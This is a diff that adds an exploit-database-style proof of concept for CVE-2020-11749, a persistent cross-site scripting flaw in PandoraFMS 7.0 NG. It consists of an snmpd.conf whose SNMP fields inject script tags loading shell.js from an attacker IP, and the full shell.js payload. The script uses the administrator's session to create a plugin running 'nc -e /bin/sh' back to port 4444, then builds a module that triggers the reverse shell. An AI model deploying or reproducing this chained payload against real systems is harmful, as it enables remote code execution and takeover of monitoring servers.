@@ -1,0 +1,118 @@
+# Exploit Title: PandoraFMS 7.0 NG 746 - Persistent Cross-Site Scripting
+# Date: 2020-07-01
+# Author: AppleBois
+# Version: 7xx ≤ 746 
+# Homepage: https://pandorafms.org/
+# Software Link: https://sourceforge.net/projects/pandora/files/Pandora FMS 7.0NG/
+# CVE-2020-11749
+# 
+# By asking network administrator to scan SNMP device to trigger Cross Site Scripting(XSS)
+# We can call a remote JavaScript file to execute arbitrary code to reach Remote Code Execution
+# on PandoraFMS.
+#
+######################################################################################
+
+//----------------/etc/snmp/snmpd.conf-------------------//
+syscontact      <script>alert('AppleBois');</script> 
+syslocation     <script type="text/javascript" src='http://192.168.11.130/shell.js'></script>
+sysname         <script type="text/javascript" src="http://192.168.11.130/shell.js"></script>
+sysDesc		<script>alert('AppleBois');</script>
+
+com2sec local   localhost       public
+view    systemview      included        .1.3.6.1.2.1.1
+view    systemview      included        .1.3.6.1.2.1.25.1
+view    systemview      included        .1      80
+
+rocommunity     public
+//--------------end of /etc/snmp/snmpd.conf--------------//
+
+
+
+//----------------shell.js-------------------------------//
+//Create Random String
+function randomString(len, charSet) {
+    charSet = charSet || 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    var randomString = '';
+    for (var i = 0; i < len; i++) {
+        var randomPoz = Math.floor(Math.random() * charSet.length);
+        randomString += charSet.substring(randomPoz,randomPoz+1);
+    }
+    return randomString;
+}
+var randomValue = randomString(5);
+
+//Declare Variable
+var xhr= new XMLHttpRequest();
+var Attacker_IP= "192.168.11.130";
+var Pandora_IP ="192.168.11.132";
+var port ="4444";
+//var payload="form_name="+randomValue+"&form_plugin_type=0&form_max_timeout5f09468e5082e_select=15&form_max_timeout5f09468e5082e_text=15&form_max_timeout=15&form_max_timeout5f09468e5082e_units=1&form_description=Created+By+AppleBois&form_execute=nc+-nv+"+Attacker_IP+"+"+port+"+-e+%2Fbin%2Fsh&form_parameters=&field1_macro=_field1_&field1_desc=&field1_value=&field1_help=&crtbutton=Create"
+var payload ="form_name="+randomValue+"&form_plugin_type=0&form_max_timeout5f096ea47b224_select=15&form_max_timeout5f096ea47b224_text=15&form_max_timeout=15&form_max_timeout5f096ea47b224_units=1&form_description=Created+By+AppleBois&form_execute=nc+-nv+"+Attacker_IP+"+"+port+"+-e+%2Fbin%2Fsh&form_parameters=&field1_macro=_field1_&field1_desc=&field1_value=&uptbutton=Update"
+var url= "http://"+Pandora_IP+"/pandora_console/index.php?sec=gservers&sec2=godmode/servers/plugin&tab=plugins&create_plugin=1&pure=";
+
+//Create a plugin with malicous command
+xhr.open("POST",url,true);
+xhr.setRequestHeader("User-Agent","Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0");
+xhr.setRequestHeader("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*//'*;q=0.8");
+xhr.setRequestHeader("Accept-Language","en-US,en;q=0.5");
+xhr.setRequestHeader("Accept-Encoding","gzip, deflate");
+xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+xhr.setRequestHeader("Referer","http://"+Pandora_IP+"/pandora_console/index.php?sec=gservers&sec2=godmode/servers/plugin&tab=&view=1&tab=plugins&pure=");
+xhr.setRequestHeader("Content-Length",payload.length);
+xhr.setRequestHeader("Connection","close");
+xhr.setRequestHeader("Upgrade-Insecure-Requests","1");
+xhr.send(payload);
+
+//I am sleepy, i just want to sleep 5 seconds. Please 
+function sleep(miliseconds) {
+                var currentTime = new Date().getTime();
+                while (currentTime + miliseconds >= new Date().getTime()) {
+                }
+            }
+sleep(5000);
+
+//Grab newly added Plugin ID
+var url="/pandora_console/index.php?sec=gagente&sec2=godmode/agentes/configurar_agente&tab=module&id_agente=2";
+xhr.open("POST",url,false);
+xhr.setRequestHeader("User-Agent","Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0");
+xhr.setRequestHeader("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*//'*;q=0.8");
+xhr.setRequestHeader("Accept-Language","en-US,en;q=0.5");
+xhr.setRequestHeader("Accept-Encoding","gzip, deflate");
+xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+xhr.setRequestHeader("Referer","http://"+Pandora_IP+"/pandora_console/index.php?sec=gservers&sec2=godmode/servers/plugin&tab=&view=1&tab=plugins&pure=");
+xhr.setRequestHeader("Content-Length",payload.length);
+xhr.setRequestHeader("Connection","close");
+xhr.setRequestHeader("Upgrade-Insecure-Requests","1");
+xhr.setRequestHeader("Cache-Control","max-age=0");
+var payload ="status_hierachy_mode_sent=1&moduletype=pluginserver&edit_module=1&updbutton=Create";
+xhr.send(payload)
+
+var el = document.createElement('html');
+var add=xhr.responseText.toString();
+el.innerHTML = add;
+var dd = el.querySelector('#id_plugin');
+var plugin_ID =0;
+for (i = 0; i < dd.options.length; i++) {
+	if(dd.options[i].text == randomValue)
+	{
+	   console.log(dd.options[i].value);
+ 	   plugin_ID=dd.options[i].value;
+	   break;
+	}
+}
+
+//Create a new plugin in server module || reverse shell will trigger here 
+var url = "http://"+Pandora_IP+"/pandora_console/index.php?sec=gagente&sec2=godmode/agentes/configurar_agente&tab=module&id_agente=2";
+var payload ="network_component_group=0&id_module_component_type=4&network_component=0&name=AppleBois_"+randomValue+"&disabled_sent=1&id_module_group=1&id_module_type_hidden=1&id_module_type=1&type_names=eyIxIjoiZ2VuZXJpY19kYXRhIiwiMiI6ImdlbmVyaWNfcHJvYyIsIjMiOiJnZW5lcmljX2RhdGFfc3RyaW5nIiwiNCI6ImdlbmVyaWNfZGF0YV9pbmMiLCI1IjoiZ2VuZXJpY19kYXRhX2luY19hYnMifQ%3D%3D&min_warning=0&max_warning=0&str_warning=&warning_inverse_sent=1&min_critical=0&max_critical=0&str_critical=&critical_inverse_sent=1&history_data=1&history_data_sent=1&id_plugin="+plugin_ID+"&macros=eyIxIjp7Im1hY3JvIjoiX2ZpZWxkMV8iLCJkZXNjIjoiIiwiaGVscCI6IiIsInZhbHVlIjoiIiwiaGlkZSI6IiJ9fQ%3D%3D&macro_name%5B%5D=macro_value&custom_id=&unit_select=none&unit_text=&unit=&module_interval_select=300&module_interval_text=5&module_interval=300&module_interval_units=60&moduletype=4&post_process_select=&post_process_text=&post_process=&min=&max=&dynamic_interval_select=0&dynamic_interval_text=&dynamic_interval=None&dynamic_interval_units=1&dynamic_min=0&dynamic_max=0&dynamic_two_tailed_sent=1&id_export=0&throw_unknown_events_sent=1&ff_type_sent=1&each_ff=0&ff_event=0&ff_event_normal=&ff_event_warning=&ff_event_critical=&module_ff_interval=0&ff_timeout=0&id_tag_selected%5B%5D=&id_tag_policy%5B%5D=&quiet_module_sent=1&cps_module=0&description=&critical_instructions=&warning_instructions=&unknown_instructions=&hour_from=*&minute_from=*&mday_from=*&month_from=*&wday_from=*&hour_to=*&minute_to=*&mday_to=*&month_to=*&wday_to=*&max_timeout=0&max_retries=0&id_category=0&parent_module_id=0&autocomplete_agent_name=&agent_autocomplete_idagent_5f0967a872ce2=0&relation_type=direct&crtbutton=Create&id_module=4&create_module=1";
+xhr.open("POST",url,true);
+xhr.setRequestHeader("User-Agent","Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0");
+xhr.setRequestHeader("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+xhr.setRequestHeader("Accept-Language","en-US,en;q=0.5");
+xhr.setRequestHeader("Accept-Encoding","gzip, deflate");
+xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+xhr.setRequestHeader("Referer","http://"+Pandora_IP+"/pandora_console/index.php?sec=gagente&sec2=godmode/agentes/configurar_agente&tab=module&id_agente=2");
+xhr.setRequestHeader("Content-Length",payload.length);
+xhr.setRequestHeader("Connection","close");
+xhr.setRequestHeader("Upgrade-Insecure-Requests","1");
+xhr.send(payload);
+//----------------end of shell.js-------------------------------//
